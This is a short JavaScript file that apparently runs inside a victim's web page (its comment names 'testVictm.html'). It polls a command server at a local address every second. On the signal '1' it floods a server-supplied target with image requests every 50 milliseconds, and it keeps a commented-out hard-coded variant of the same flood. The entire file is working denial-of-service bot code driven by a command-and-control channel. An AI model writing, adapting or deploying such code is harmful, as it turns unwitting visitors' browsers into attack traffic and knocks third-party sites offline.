/* This file does not have the minified jquery code. THe testVictm.html file
 has the jwuery CDN linked to enable quick editing and of this script
 without a giant file open in my text editor. */
setInterval('main()',1000);
function main(){
    $.ajax({
        url: "http://127.0.0.1:3000/api",
        type: "GET",
        contentType: 'application/json; charset=utf-8',
        success: function(resp) {
            if(resp.status == "1"){
                var floodInterval = setInterval(flood,50);
            } else if (resp.status =="0") {
                var floodInterval = setInterval(flood,9999999999999);
                clearInterval(floodInterval);
            } else {}
            function flood(){
                var img = new Image();
                img.src = "http://" + resp.target;
                img.onload;
            }
        },
        error : function(jqXHR, textStatus, errorThrown) {},
        timeout: 120000,
    });
}
/*
function main() {
    var img = new Image();
    img.src = 'http://target/page.html';
    img.onload;
}
var floodInterval = setInterval('flood()',50);
*/
